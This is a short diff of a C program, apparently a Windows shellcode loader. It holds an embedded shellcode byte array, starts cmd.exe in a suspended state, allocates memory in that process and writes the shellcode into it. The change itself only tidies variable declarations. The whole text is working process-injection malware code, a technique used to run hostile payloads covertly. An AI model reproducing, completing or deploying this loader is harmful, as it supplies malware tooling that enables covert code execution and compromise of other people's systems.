@@ -5,9 +5,6 @@ const unsigned char buf[] = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x
 
 int main(int argc, char * argv[]) {
 
-    BOOL rv;
-    LPVOID exec_mem;
-
     STARTUPINFOW si = {0};
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESHOWWINDOW;
@@ -16,7 +13,7 @@ int main(int argc, char * argv[]) {
 
     CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
-    exec_mem = VirtualAllocEx(pi.hProcess, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    LPVOID exec_mem = VirtualAllocEx(pi.hProcess, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     size_t bytesWritten = 0;
     WriteProcessMemory(pi.hProcess, exec_mem, buf, sizeof(buf), &bytesWritten);
